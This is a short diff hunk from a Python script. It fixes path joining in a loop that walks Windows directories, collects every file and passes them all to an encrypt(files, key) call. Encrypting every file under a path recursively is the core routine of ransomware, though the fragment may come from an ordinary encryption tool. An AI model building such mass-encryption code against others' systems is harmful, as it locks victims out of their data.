@@ -72,7 +72,7 @@ if __name__ == '__main__':
                 files = set()
                 for item in itemsInPath:
                     if os.path.isdir(path+item):
-                        directories.add(path+item)
+                        directories.add(path+"\\"+item)
                     else:
                         files.add(path+"\\"+item) 
                 encrypt(files, key)
